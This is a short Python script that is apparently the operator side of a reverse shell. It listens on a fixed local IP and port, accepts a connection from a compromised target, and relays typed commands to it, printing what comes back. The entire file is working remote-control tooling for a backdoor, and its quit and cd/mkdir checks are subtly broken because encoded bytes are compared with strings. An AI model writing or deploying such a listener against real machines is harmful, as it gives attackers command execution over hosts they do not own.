import socket

listener_ip = '192.168.1.148'
listener_port = 6996

def shell_command():
    while True:
        command = input("[-] RemoteCommand~#: ")
        command = command.encode()
        target.send(command)
        if command == 'q':
            target.close()
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:5] == 'mkdir' and len(command) > 1:
            continue
        else:
            result = target.recv(2048)
            result = result.decode()
            print(result)

def listener():
    global sock
    global ip
    global target
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    sock.bind((listener_ip, listener_port))
    sock.listen()
    print("[+] Listening for target ...\n")
    target, ip = sock.accept()
    print("[+] Get connection from target. Starting shell command...\n")

if __name__ == "__main__":
    listener()
    shell_command()
    sock.close()